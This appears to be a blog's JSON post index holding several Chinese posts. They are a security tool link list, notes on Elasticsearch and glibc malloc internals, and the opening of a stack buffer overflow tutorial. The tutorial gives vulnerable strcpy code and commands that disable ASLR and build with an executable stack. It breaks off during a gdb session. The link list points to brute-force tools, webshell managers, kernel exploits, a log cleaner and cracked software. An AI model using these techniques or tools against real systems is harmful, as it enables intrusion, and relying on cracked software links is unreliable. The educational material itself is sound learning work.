MP3Stego–[http://www.petitcolas.net/steganography/mp3stego/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.petitcolas.net%2Fsteganography%2Fmp3stego%2F)\n ffmpeg(forvideoanalysis)–[https://www.ffmpeg.org/download.html](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.ffmpeg.org%2Fdownload.html)\n\n电子取证:\n dd–unix/linuxtool\n strings–unix/linuxtool\n scalpel–[https://github.com/sleuthkit/scalpel](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fsleuthkit%2Fscalpel)\n TrID–[http://mark0.net/soft-trid-e.html](https://links.jianshu.com/go?to=http%3A%2F%2Fmark0.net%2Fsoft-trid-e.html)\n binwalk–[http://binwalk.org/](https://links.jianshu.com/go?to=http%3A%2F%2Fbinwalk.org%2F)\n foremost–[http://foremost.sourceforge.net/](https://links.jianshu.com/go?to=http%3A%2F%2Fforemost.sourceforge.net%2F)\n ExifTool–[http://www.sno.phy.queensu.ca/~phil/exiftool/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.sno.phy.queensu.ca%2F~phil%2Fexiftool%2F)\n DigitalForensicsFramework(DFF)–[http://www.digital-forensic.org/download/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.digital-forensic.org%2Fdownload%2F)\n ComputerAidedINvestigativeEnvironment(CAINE)Linuxforensicslivedistribution–[http://www.caine-live.net/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.caine-live.net%2F)\n TheSleuthKit(TSK)–[http://www.sleuthkit.org/sleuthkit/download.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.sleuthkit.org%2Fsleuthkit%2Fdownload.php)\n Volatility–[http://code.google.com/p/volatility/](https://links.jianshu.com/go?to=http%3A%2F%2Fcode.google.com%2Fp%2Fvolatility%2F)\n\n编程以及编码工具/PPC:\n Texteditors:\n SublimeText–[http://www.sublimetext.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.sublimetext.com%2F)\n Notepad++–[http://notepad-plus-plus.org/](https://links.jianshu.com/go?to=http%3A%2F%2Fnotepad-plus-plus.org%2F)\n vim–[http://www.vim.org/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.vim.org%2F)\n emacs–[http://www.gnu.org/software/emacs/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.gnu.org%2Fsoftware%2Femacs%2F)\n\n密码学:\n Cryptool–[https://www.cryptool.org/](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.cryptool.org%2F)\n hashpump–[https://github.com/bwall/HashPump](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fbwall%2FHashPump)\n Sage–[http://www.sagemath.org/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.sagemath.org%2F)\n JohntheRipper–[http://www.openwall.com/john/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.openwall.com%2Fjohn%2F)\n xortool–[https://github.com/hellman/xortool](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fhellman%2Fxortool)\n\n在线工具:\n [http://www.crypo.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.crypo.com%2F)\n [http://www.cryptool-online.org/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cryptool-online.org%2F)\n [http://rumkin.com/tools/cipher/](https://links.jianshu.com/go?to=http%3A%2F%2Frumkin.com%2Ftools%2Fcipher%2F)\n Modulesforpython–pycrypto–[https://www.dlitz.net/software/pycrypto/](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.dlitz.net%2Fsoftware%2Fpycrypto%2F)\n\ncmd5:\n\n[http://pmd5.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fpmd5.com%2F)\n\n[http://www.cmd5.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cmd5.com%2F)\n\n进制转换-[https://tool.lu/hexconvert](https://links.jianshu.com/go?to=https%3A%2F%2Ftool.lu%2Fhexconvert)\n\n在线运行代码-[https://c.runoob.com/compile/1](https://links.jianshu.com/go?to=https%3A%2F%2Fc.runoob.com%2Fcompile%2F1)\n **工具**\n 秘迹：[https://m.mijisou.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fm.mijisou.com%2F)\n\n在线病毒检测引擎：[http://www.virscan.org/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.virscan.org%2F)\n\n云扫描病毒：[http://www.scanvir.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.scanvir.com%2F)\n\n威胁情报分析平台：[https://x.threatbook.cn/partner](https://links.jianshu.com/go?to=https%3A%2F%2Fx.threatbook.cn%2Fpartner)\n\nWebShell检测引擎：[https://scanner.baidu.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fscanner.baidu.com%2F)\n\n知道创宇：[https://github.com/knownsec](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fknownsec)\n\nDm：[https://github.com/Dm2333](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FDm2333)\n\nEventCleaner：[https://github.com/360-A-Team/EventCleaner](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2F360-A-Team%2FEventCleaner)\n\n验证码识别库：[http://www.wzdr.cn/article-534.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.wzdr.cn%2Farticle-534.html)\n\n中国特色弱口令生成器：[https://github.com/RicterZ/genpAss](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FRicterZ%2FgenpAss)\n\nMSDN各种工具和服务器镜像：[https://msdn.itellyou.cn/](https://links.jianshu.com/go?to=https%3A%2F%2Fmsdn.itellyou.cn%2F)\n\nC32asm最佳的静态反汇编软件：[http://www.c32asm.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.c32asm.com%2F)\n\nPHP在线加解密网站：[http://www.zhaoyuanma.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.zhaoyuanma.com%2F)\n\nK8工具合集：[https://github.com/k8gege/K8tools](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fk8gege%2FK8tools)\n\nWinAFL模糊测试工具：[https://github.com/ivanfratric/winafl](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fivanfratric%2Fwinafl)\n\n异步目标枚举工具：[https://github.com/welchbj/bscan](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fwelchbj%2Fbscan)\n\n开源扫描仪工具箱：[https://github.com/We5ter/Scanners-Box](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FWe5ter%2FScanners-Box)\n\nFCN：[https://github.com/boywhp/fcn](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fboywhp%2Ffcn)\n\n浏览器的PWN：[https://github.com/m1ghtym0/browser-pwn](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fm1ghtym0%2Fbrowser-pwn)\n\n高级威胁战术：[https://www.cobaltstrike.com/training](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.cobaltstrike.com%2Ftraining)\n\n风控预警平台：[https://github.com/creditease-sec/insight](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fcreditease-sec%2Finsight)\n\n暴力破解工具Hydra（九头蛇）：\n\nhttps://www.jianshu.com/p/e02ef0a00786\n\n万能密码字典：\n\n[https://wenku.baidu.com/view/d55f60e4c281e53a5902ff0d](https://links.jianshu.com/go?to=https%3A%2F%2Fwenku.baidu.com%2Fview%2Fd55f60e4c281e53a5902ff0d)\n\nSubFinder是一个子域发现工具：\n\n[https://github.com/subfinder/subfinder](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fsubfinder%2Fsubfinder)\n\n中国蚂剑：\n\n[https://github.com/AntSwordProject/antSword/releases](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FAntSwordProject%2FantSword%2Freleases)\n\nWindows-Exploit-Suggester：\n\n[https://github.com/GDSSecurity/Windows-Exploit-Suggester](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FGDSSecurity%2FWindows-Exploit-Suggester)\n\n构造优质上传漏洞fuzz字典：\n\n[http://gv7.me/articles/2018/make-upload-vul-fuzz-dic/](https://links.jianshu.com/go?to=http%3A%2F%2Fgv7.me%2Farticles%2F2018%2Fmake-upload-vul-fuzz-dic%2F)\n\n一款识别图形验证码的BurpSuite插件：\n\nhttps://www.jianshu.com/p/a0262883b751\n\nslowloris.py-Python中的简单slowloris：\n\n[https://github.com/gkbrk/slowloris](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fgkbrk%2Fslowloris)\n\nSharpSploit控制台：\n\n[https://github.com/anthemtotheego/SharpSploitConsole](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fanthemtotheego%2FSharpSploitConsole)\n\n研究个人编译APT恶意软件：\n\n[https://github.com/sapphirex00/Threat-Hunting](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fsapphirex00%2FThreat-Hunting)\n\n代理行动规则：\n\n[https://github.com/PortSwigger/proxy-action-rules](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FPortSwigger%2Fproxy-action-rules)\n\nSwitchHosts---快速切换主机：\n\n[https://github.com/oldj/SwitchHosts](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Foldj%2FSwitchHosts)\n\nXshell6.0破解版本（绿色破解）：\n\n[https://download.csdn.net/download/qq_32589267/10792860](https://links.jianshu.com/go?to=https%3A%2F%2Fdownload.csdn.net%2Fdownload%2Fqq_32589267%2F10792860)\n\nBurpSuite破解版（含注册机，无后门）：\n\n[https://blog.csdn.net/u014549283/article/details/81248886](https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fu014549283%2Farticle%2Fdetails%2F81248886)\n\nx-pack-core-6.4.2破解版亲测可用：\n\n[https://download.csdn.net/download/czs208112/10718181](https://links.jianshu.com/go?to=https%3A%2F%2Fdownload.csdn.net%2Fdownload%2Fczs208112%2F10718181)\n\nWiki收集RedTeam基础架构强化资源：\n\n[https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fbluscreenofjeff%2FRed-Team-Infrastructure-Wiki)\n\n应急响应工具大合集：\n\n[https://github.com/meirwah/awesome-incident-response](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fmeirwah%2Fawesome-incident-response)\n\n蜜罐：\n\n[https://github.com/paralax/awesome-honeypots/blob/master/README_CN.md](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fparalax%2Fawesome-honeypots%2Fblob%2Fmaster%2FREADME_CN.md)\n\n电子书籍：\n\n安全思维导图集合：[https://github.com/SecWiki/sec-chart](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FSecWiki%2Fsec-chart)\n PHP编程：[https://pan.baidu.com/s/1ZvUdonJ_h3EYTfHIbjoe6A](https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F1ZvUdonJ_h3EYTfHIbjoe6A)\n 代码审计入门：[http://www.cnblogs.com/Oran9e/p/7763751.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cnblogs.com%2FOran9e%2Fp%2F7763751.html)\n 墨者学院审计类通关指南：[https://xz.aliyun.com/t/2821](https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F2821)\n IT畅销电子书：[https://www.packtpub.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.packtpub.com%2F)\n\n资源网站：\n KaliLinux渗透测试：\n [https://mp.weixin.qq.com/s/8UcU7R803k3gcextswzGlQ](https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F8UcU7R803k3gcextswzGlQ)\n Oday安全：\n [http://www.0daysecurity.com/penetration-testing/enumeration.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.0daysecurity.com%2Fpenetration-testing%2Fenumeration.html)\n IT资料搜寻网站：\n [https://www.programcreek.com/java-api-examples/?action=search](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.programcreek.com%2Fjava-api-examples%2F%3Faction%3Dsearch)\n web安全基础（解压密码：xindong）：\n [https://pan.baidu.com/s/1xyAXrQceq9bUzfBrYc4bBA](https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F1xyAXrQceq9bUzfBrYc4bBA)\n\n其它知识点：\n Poc基础知识：[https://poc.evalbug.com/chapter1/1.html](https://links.jianshu.com/go?to=https%3A%2F%2Fpoc.evalbug.com%2Fchapter1%2F1.html)\n 对CDN的误区：[http://www.rinige.com/index.php/archives/772/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.rinige.com%2Findex.php%2Farchives%2F772%2F)\n 同时部署WAF和CDN：\n [https://help.aliyun.com/knowledge_detail/42200.html](https://links.jianshu.com/go?to=https%3A%2F%2Fhelp.aliyun.com%2Fknowledge_detail%2F42200.html)\n Linux系统清除缓存【整理】：\n [https://blog.csdn.net/qiuzhi__ke/article/details/70768544](https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fqiuzhi__ke%2Farticle%2Fdetails%2F70768544)\n 大马小马的区别：\n [http://www.cnhonkerarmy.com/thread-156156-1-1.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cnhonkerarmy.com%2Fthread-156156-1-1.html)\n 面试必备之乐观锁与悲观锁：\n [https://blog.csdn.net/qq_34337272/article/details/81072874](https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fqq_34337272%2Farticle%2Fdetails%2F81072874)\n 一套实用的渗透测试岗位面试题：\n [https://zhuanlan.zhihu.com/p/25582026](https://links.jianshu.com/go?to=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F25582026)\n IPC![、ADMIN](https://math.jianshu.com/math?formula=%E3%80%81ADMIN)、C![、D](https://math.jianshu.com/math?formula=%E3%80%81D)是什么?如何关闭删除Windows默认共享：\n [https://m.jb51.net/softjc/2124.html](https://links.jianshu.com/go?to=https%3A%2F%2Fm.jb51.net%2Fsoftjc%2F2124.html)\n php下进行mysql参数化查询：\n [https://blog.csdn.net/lpwmm/article/details/50733698](https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Flpwmm%2Farticle%2Fdetails%2F50733698)\n\n闲趣文章：\n\n2018中国白帽人才调查报告：\n\n[https://www.anquanke.com/post/id/170034](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.anquanke.com%2Fpost%2Fid%2F170034)\n\n如何走进黑客世界：\n\n[https://www.freebuf.com/articles/neopoints/190895.html](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.freebuf.com%2Farticles%2Fneopoints%2F190895.html)\n\n网络安全行业全景图：\n\n[https://mp.weixin.qq.com/s/gksuSM7S-MLZ5LFz6-kjdw](https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FgksuSM7S-MLZ5LFz6-kjdw)\n\n\n\n## linux kernel\n\n进行分析的大致流程如下：首先要会搭建环境，复现相应版本的相应漏洞，可以用gdb+qemu，也可以用另一台机器编译内核。然后查看源码并调试，这可以折腾自己喜欢的编辑器，并对照相应的补丁，了解更多细节。最后可以尝试在poc的基础上写自己的exp。自己直接阅读 Linux kernel 源码的话可能无从下手，可以先了解一下Linux内核源码目录结构，比如 drivers是设备驱动、arch是cpu相关代码、virt是虚拟化相关、security实现安全特性等等。然后从Linux内核可以被攻击的方面出发，比如系统调用、驱动、进程管理、网络，然后查找相应cve，比如CVE-2017-5123属于系统调用的漏洞。了解常见的攻击类型，比如栈溢出、堆溢出、UAF、整数溢出、race condition、权限检查不当、类型转换错误等等。了解Linux内核的防护机制，比如KASLR、SMEP、SELINUX等等。\n\n### Interactive map of Linux kernel\n\nhttp://www.makelinux.net/kernel_map/\n\n## 书籍\n\n### 《A Guide to Kernel Exploitation: Attacking the Core》，Enrico Perla, Massimiliano Oldani\n\nhttp://library1.org/_ads/373CE0A3D91F602AC181CA04E04BDDF8\n\n### 《Linux Kernel Architecture》，Wolfgang Mauerer\n\nhttp://library1.org/_ads/43D6ABBD76FE1BD19BDE10E904CD0C79\n\n### 《Linux Kernel Development (3rd Edition) 》，Robert Lovetorvalds\n\nhttp://library1.org/_ads/8799C7900BCC639DB78BC2CD0F8CB3AC\n\n## 源码\n\n### Linux内核源码\n\nhttps://github.com/torvalds/linux\n\n### Linux各版本内核\n\nhttps://www.kernel.org/pub/linux/kernel/\n\n### Linux内核代码在线查看\n\n[http://lxr.free-electrons.com](http://lxr.free-electrons.com/)\n\n## exp及分析文章\n\n### linux-kernel-exploits\n\nhttps://github.com/SecWiki/linux-kernel-exploits\n\n### kernel exploit\n\nhttps://github.com/lucyoa/kernel-exploits\n\n### kernel heap overflow利用\n\nhttps://zhuanlan.zhihu.com/p/26674557\n\n### kernel exploit(适合入门)\n\nhttps://github.com/eternalsakura/ctf_pwn/blob/master/kernel_pwn/kernel-exploits.pdf\n\n### blackhat kernel议题\n\nhttps://www.blackhat.com/presentations/bh-usa-03/bh-us-03-cesare.pdf\n\n## FUZZ\n\n### syzkaller\n\n这个链接的前半部分的内容详细解释了如何搭建一个qemu + gdb的环境\nhttps://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md\n\n### Awesome-Fuzzing\n\nhttps://github.com/secfigo/Awesome-Fuzzing\n\n## 其他\n\n### x86_64 Assembly\n\nhttps://0xax.github.io/categories/assembler/\n\n### 64-bit system call numbers and entry vectors\n\nhttps://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl\n\n### 翻过的文章记录\n\n深入理解linux系统下proc文件系统内容\nhttp://www.cnblogs.com/cute/archive/2011/04/20/2022280.html\nWhat is mode_t in C?\nhttps://jameshfisher.com/2017/02/24/what-is-mode_t.html\nUnderstanding a Kernel Oops!\nhttp://opensourceforu.com/2011/01/understanding-a-kernel-oops/\nLinux Kernel Procfs Guide\nhttps://kernelnewbies.org/Documents/Kernel-Docbooks?action=AttachFile&do=get&target=procfs-guide_2.6.29.pdf\n用户空间与内核空间数据交换的方式(2)——procfs\nhttp://www.cnblogs.com/hoys/archive/2011/04/10/2011141.html\n用户空间和内核空间传递数据：get_user；put_user;copy_to_user;copy_from_user\nhttp://www.cnblogs.com/wanghetao/archive/2012/06/02/2532225.html\n谈结构体struct 初始化多出的点号“.”，数组[]初始化多出的逗号“,”\nhttps://blog.csdn.net/comwise/article/details/9087279\nRoot exploit for Android and Linux（CVE-2010-4258）\nhttps://blog.csdn.net/hu3167343/article/details/36892563\n\n\n\n思维导图：\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190728162957829.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RSb25kb25n,size_16,color_FFFFFF,t_70)\n\n\n\n","tags":["ctf"],"categories":["ctf"]},{"title":"ElasticSearch基本原理介绍","url":"/2020/02/10/es基本原理介绍/","content":"\n## ElasticSearch基本原理介绍\n\n### 索引结构\n\n在存储结构上，由_index, _type和_id唯一标示一个文档。_index指向一个或者多个物理分片的逻辑命名空间，_type类型用于区分同一个集合中的不同的细分。_id文档标识符由系统自动生成或者使用者提供。\n\n### 分片\n\nES将数据副本分为主从两个部分，即主分片和副分片。主分片为权威数据，写过程先写主分片，成功之后再写副分片，恢复过程以主分片为主。 \n\n### 集群内部原理\n\n集群节点角色：\n\n1. 主节点\n\n主节点负责集群层面的相关操作，管理集群变更\n\n通过配置node.master:true节点具有被选举为master的资格，主节点是全局唯一的，将从有资格成为master的节点中进行选举。\n\n主节点也可以成为数据节点，但尽可能的做少量的工作，因此生产环境应尽量分离主节点和数据节点，创建独立节点的配置：\n\nnode.master: true\n\nnode.data: false\n\n为了防止数据丢失，每个主节点应该知道有资格成为主节点的数目，默认为1，为了避免网络分区时候出现多主的情况，配置discovery.zen.minimum_master_nodes原则上最小值应该是（master_eligible_nodes/2）+1\n\n2. 数据节点\n\n负责保存数据，执行数据相关操作，CRUD，搜索，聚合等，数据节点对CPU，内存，IO要求较高。通过配置node.data: true来使一个节点成为数据节点。也可以通过下面的配置:\n\nnode.master: false\n\nnode.data: true\n\nnode.ingest: false\n\n3. 预处理节点\n\n预处理节点在5.0之后引入。默认情况下在所有的节点上启用ingest，如果想在某个节点上禁用ingest，则可以添加配置node.ingest: false。也可以通过下面的配置创建一个仅用于预处理的节点：\n\nnode.master: false\n\nnode.data: false\n\nnode.ingest：false\n\n4. 协调节点\n\n客户端请求可以发送到集群的任意节点，每个节点都知道任意文档所在的位置，然后转发这些请求，收集数据并返回给客户端，处理客户端请求的节点称为协调节点。\n\n协调节点将请求转发给保存数据的数据节点。每个数据节点在本地执行请求，并将结果返回给协调节点，协调节点收集完数据之后将数据节点的结果合并为单个全局结果，对结果收集和排序的过程可能需要很多CPU和内存资源。\n\n配置：\n\nnode.master: false\n\nnode.data: false\n\nnode.ingest: false\n\n5. 部落节点\n\n允许部落节点在多个集群之间充当联合客户端\n\n客户端的属性：\n\nnode.master: false\n\nnode.data: false\n\n它不做主节点，不做数据节点，仅用于路由请求，本质上是一个智能负载均衡器。\n\n### 集群的健康度状态\n\n集群的健康度状态分为三种：\n\n1. Green: 主分片和副分片都正常运行\n2. Yellow: 所有的主分片都正常运行，但不是所有的副分片都正常运行，意味着有单点故障的风险。\n3. Red: 有主分片没能正常运行\n\n### 集群扩容\n\n当扩容集群，添加节点时候，分片会均衡地分配到集群的每个节点上，从而对索引和搜索过程进行负载均衡，这些都是系统自动完成。\n\n分片副本实现数据冗余，从而防止硬件故障导致的数据丢失。\n\n### 主要内部模块介绍\n\n#### Cluster\n\nCluster模块是主节点执行集群管理的我封装实现，管理集群状态，维护集群层面的配置信息。主要功能：\n\n* 管理集群状态，将新生成的集群状态发布到集群节点\n* 调用allocation模块执行分片分配，决策那些分片应该分配到哪个节点\n* 集群各节点中直接迁移分片，保持数据平衡\n\n#### allocation\n\n封装分片分配相关的功能和策略，包括主分片的分配和副分片的分配，本模块由主节点调用。创建新索引，集群完全重启都需要分片分配的过程\n\n#### Discovery\n\n发现模块负责发现集群中的节点，以及选举主节点。当节点加入或退出集群时，主节点会采取相应的行动。\n\n#### Gateway\n\n负责对收到Master广播下来的集群状态数据的持久化存储，并在集群完全重启时恢复他们。\n\n#### Indices\n\n索引模块管理全局级的索引设置，不包括索引级的，它还封装了索引数据恢复功能。集群启动阶段需要的主分片恢复和副分片恢复就是在这个模块实现。\n\n#### HTTP\n\nHTTP模块允许通过JSON over HTTP的方式访问ES的API，HTTP模块本质上完全异步的，意味着没有阻塞线程等待响应。使用异步通信进行HTTP的好处是解决了C10k问题（10k量级的并发连接）。\n\n在部分场景中，可考虑使用HTTP keepalive来提升性能，注意，不要在客户端使用http chunking\n\n#### Transport\n\n传输模块用于集群内节点之间的内部通信，从一个节点到另一个节点的每个请求都使用传输模块。\n\n#### Engine\n\nEngine模块封装了对Lucene的操作及translog的调用，它是对一个分片读写操作的最终提供者。\n\n### 选主算法\n\nbolly算法：选择ID较大的，在es中选择id较小的机器为master节点。\n\n","tags":["ElasticSearch"],"categories":["ElasticSearch"]},{"title":"ptmalloc学习","url":"/2020/01/26/ptmalloc学习/","content":"\n## ptmalloc学习\n\nptmalloc2 是linux glibc中当前使用的内存堆分配。之前使用的dlmalloc，现在逐步都被支持多线程的ptmalloc来替代了。\n\n我们之前学习过系统底层是调用的brk和mmap来实现内存分配的。\n\nptmalloc2多线程情况下分配内存的时候，每个线程有一个独立的heap segment和freelist数据结构保持于其他堆独立。这个行为我们称作为per thread arena;\n\n需要注意的是，即使用户请求内存只有1000字节，堆内存分配的时候还是会提供132KB大小被创建。这种连续的堆内存区域我们称作为arena。主线程创建的我们称作为main arena;\n\n如果当程序超过了这个arena区域可用空寂哦哦安的时候，他能够增加通过程序break位置的方式。top chunk大小可以适配 extra space空间。类似的如果有很多可用空间在top chunk中的时候，他可以缩小。\n\n除了这个1ＭＢ的堆分配外，只有132KB的读写权限被设置，因此这个连续的内存区域被称作为thread arena;如果超过128KB（132*1024）请求大小，超过了malloc可用空间的时候，内存分配通过使用mmap系统调用来申请，无论请求来自于main arena还是thread arena; arena的限制来自于系统的cores数目；\n\n32bit: Number of arena = 2 * number of cores;\n\n63bit: Number of arena = 8 * number of cores;\n\nheap的主要信息有下面这些：\n\nheap_info： heap header信息，单线程thread arena能有多堆。\n\nmalloc_state: arena header\n\nmalloc_chunk:  chunk_header\n\nmain arena因为没有多heap，所以没有heap_info。不像thread arena，main arena header不是sbrk的 heap segment的一部分。他是一个全局变量，因此可以在libc.so data segment找到。\n\n![img](https://docs.google.com/drawings/d/1367fdYcRTvkyfZ_s27yg6oJp5KYsVAuYqPf8szbRNc0/pub?w=960&h=720)\n\n![img](https://docs.google.com/drawings/d/1367fdYcRTvkyfZ_s27yg6oJp5KYsVAuYqPf8szbRNc0/pub?w=960&h=720)\n\n![img](https://docs.google.com/drawings/d/150bTi0uScQlnABDImLYS8rWyL82mmfpMxzRbx-45UKw/pub?w=960&h=720)\n\nchunk: 一个chunk包含在一个heap segment中，包括以下几个：\n\n1. allocated chunk\n\n   ![img](https://docs.google.com/drawings/d/1eLkG-WF9U3O_ytNs6iFKHacqkjWZeY4KtLqxmd01EVs/pub?w=962&h=682)\n\n2. free chunk\n\n   ![img](https://docs.google.com/drawings/d/1YrlnGa081NpO0D3wcoaJbGvhnPi3X6bBKMc3bN4-oZQ/pub?w=940&h=669)\n\n   其中 bins是freelist的数据结构，在free chunk中被使用。\n\n   fast bin, unsorted bin, small bin, large bin\n\n   fastbinsY： 这个数组支持fastbins\n\n   bins: bin1  unsorted bin, bin2-bin63 small bin, bin64-bin126 large bin;\n\n   fastbin: chunk大小在16-80字节被称作为fast chunk;\n\n   ![img](https://docs.google.com/drawings/d/144diIfbLqUmOPlAWbtP45mGsZlIl3PZWJvvH-cvQziU/pub?w=960&h=720)\n\n   unsorted bin: \n\n   当释放小块或大块时，而不是将它们添加到各自的容器，将他们释放的空间放入unsortedbin中。这种方式给了glibc malloc重用最近释放的chunk的机会。因此，内存分配和释放会加快一点。因为寻找合适的垃圾箱所花费的时间减少了。\n\n   ![img](https://docs.google.com/drawings/d/1Kf_eg7uB2mRjSOasTc4dIu5fuBpTAK0GxbnKVTkZd0Y/pub?w=1217&h=865)\n\n   small bin: chunk小于512字节的被称作为small chunk;\n\n   large bin: chunk大于512字节的被称作为large chunk;\n\n3. Top Chunk：\n\n   在top边界上的arena被称作为top chunk;\n\n4. Last Remainder Chunk：\n\n   从最近的一个小请求分裂。最后的剩余块有助于改善引用的局部性，即小块的连续的malloc请求可能最终被分配到彼此接近的地方。\n\n### 参考\n\nhttps://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/\n\nhttps://www.cnblogs.com/alisecurity/p/5486458.html\n\n\n\n\n\n","tags":["malloc"],"categories":["malloc"]},{"title":"Linux Malloc底层分配原理【翻译】","url":"/2020/01/24/linux内存malloc底层实现/","content":"\n## Linux Malloc底层分配原理【翻译】\n\nlinux中malloc函数还是通过syscall来分配内存的。通过调用brk或者mmap syscall函数来分配内存。\n\n![img](https://docs.google.com/drawings/d/105HDvkEvIW2lsyaQjj758Lbyx6A-_K7jviheyzeAwl8/pub?w=480&h=238)\n\nbrk函数：从内核分配内存（非0初始化）通过增加程序break位置来实现。初始化堆segment得开始与结束指向相同的位置。\n\n如果ASLR关闭的时候，start_brk和brk将指向data/bss segment结束的位置。\n\n如果ASLR打开的时候，start_brk和brk将等于data/bss segment结束的位置通过随机brk offset\n\n![img](https://i2.wp.com/static.duartes.org/img/blogPosts/linuxFlexibleAddressSpaceLayout.png)\n\nmmap: malloc函数使用mmap来创建一个私有匿名映射segment.分配私有匿名的主要目的是分配一个新的内存（0填充的）这个新的内存将被调用进程的时候额外使用。\n\n\n\n### 参考\n\nhttps://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/\n\nhttps://manybutfinite.com/post/anatomy-of-a-program-in-memory/\n\n\n\n","tags":["malloc"],"categories":["malloc"]},{"title":"pwn学习笔记1","url":"/2020/01/23/pwn学习笔记/","content":"\n## pwn学习笔记1\n\n### 学习笔记\n\n其实参考的是https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/文章中的教程，学习下pwn的基础知识。\n\n环境：ubuntu14.04\n\n漏洞代码：\n\n```c\n//vuln.c\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char* argv[]) {\n        /* [1] */ char buf[256];\n        /* [2] */ strcpy(buf,argv[1]);\n        /* [3] */ printf(\"Input:%s\\n\",buf);\n        return 0;\n}\n```\n\n其实就是简单的栈溢出利用，超过256个字符的时候会发生栈溢出问题。\n\n首先我们需要关闭内存地址随机化。保证栈溢出地址固定。\n\n```ruby\necho 0 > /proc/sys/kernel/randomize_va_space\n```\n\n编译和打开栈执行\n\n```\ngcc -g -fno-stack-protector -z execstack -o vul1 vul1.c\nchmod +s vul1\n```\n\ngdb调试：\n\n```shell\nsaar@saar-virtual-machine:~/pwn$ gdb vul1 \nGNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1\nCopyright (C) 2014 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"i686-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the 